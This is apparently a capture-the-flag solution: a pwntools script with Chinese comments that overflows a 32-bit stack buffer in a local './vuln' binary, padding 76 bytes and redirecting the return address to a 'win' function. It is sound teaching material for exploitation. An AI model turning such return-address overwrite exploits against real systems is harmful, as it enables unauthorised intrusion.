from pwn import *

context(arch='i386', os='linux')

# 本地测试
p = process('./vuln')

# 远程测试
# p = remote('靶机IP', 端口)

def exploit():
    # 获取win函数地址
    elf = ELF('./vuln')
    win_addr = elf.symbols['win']
    
    # 构造payload
    payload = b'A' * 76  # 填充buffer + ebp
    payload += p32(win_addr)  # 覆盖返回地址
    
    # 发送payload
    p.sendlineafter(b'Enter your payload: ', payload)
    
    # 切换到交互模式
    p.interactive()

if __name__ == '__main__':
    exploit()